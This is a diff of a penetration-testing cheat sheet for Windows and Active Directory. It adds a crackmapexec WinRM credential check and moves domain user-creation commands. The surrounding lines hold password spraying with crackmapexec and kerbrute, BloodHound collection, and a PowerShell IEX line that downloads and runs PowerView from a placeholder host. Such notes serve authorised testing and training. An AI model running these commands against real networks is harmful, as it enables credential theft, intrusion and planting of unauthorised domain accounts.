@@ -513,6 +513,9 @@ crackmapexec smb {IP ADDRESS} -u {USER.txt} -p {PASSWORDS.txt} --shares --contin
 crackmapexec smb {IP ADDRESS} --pass-pol
 crackmapexec smb {IP ADDRESS} --pass-pol -u '' -p ''
 
+# Winrm credential check
+crackmapexec winrm {IP ADDRESS} -u '{USER}' -p '{PASSWORD}'
+
 # Mount SMB Drive
 sudo mount -t cifs //{IP ADDRESS}/{SHARE} /mnt/{SHARE}/
 sudo mount -t cifs -o 'username={USERNAME},password={PASSWORD}' //{IP ADDRESS}/{SHARE} /mnt/{SHARE}/
@@ -627,6 +630,12 @@ net user {USERNAME} /domain
 # Enumerate all groups in domain
 net group /domain
 
+# Add user
+net user {USERNAME} {PASSWORD} /add /domain
+
+# Add user to group
+net group "{GROUP}" {USERNAME} /add
+
 # Kerbrute Brute Force
 sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS}  {user.txt}  
 sudo /opt/kerbrute/kerbrute passwordspray -d {DOMAIN} --dc {IP ADDRESS}  {user.txt} {passwords.txt}
@@ -654,13 +663,6 @@ SharpHound.exe -c all                       # RHOST
 
 # Bloodhound python remote access
 sudo python3 /opt/BloodHound.py/bloodhound.py -u '{USERNAME}' -p '{PASSWORD}' -ns {IP ADDRESS} -d {DOMAIN} -c all
-
-
-# Add user
-net user {USERNAME} {PASSWORD} /add /domain
-
-# Add user to group
-net group "{GROUP}" {USERNAME} /add
 
 # Powerview example
 IEX(New-Object Net.WebClient).downloadstring("http://{IP ADDRESS}/PowerView.ps1")
